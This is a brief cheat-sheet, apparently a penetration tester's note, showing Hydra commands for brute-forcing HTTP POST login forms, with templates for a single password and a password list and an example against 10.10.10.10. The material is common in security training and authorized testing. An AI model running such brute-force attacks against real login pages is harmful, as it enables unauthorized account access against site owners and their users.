# Hydra

Protocol brute-forcing tool

## Brute force HTTP login page

* Single password

```bash
hydra -L $USER_LIST -p $PASSWORD $TARGET_HOSTNAME_OR_IP http-post-form '$URI:$USER_PARAMETER=^USER^&$PASSWORD_PARAMTER=^PASS^:F=$FAILURE_STRING' -v
```

* Password list

```bash
hydra -L $USER_LIST -P $PASSWORD_LIST $TARGET_HOSTNAME_OR_IP http-post-form '$URI:$USER_PARAMETER=^USER^&$PASSWORD_PARAMTER=^PASS^:F=$FAILURE_STRING' -v
```

* Example:

```bash
hydra -L users.txt -p Password123 10.10.10.10 http-post-form '/api/login:username=^USER^&password=^PASS^:F=failed' -v
```
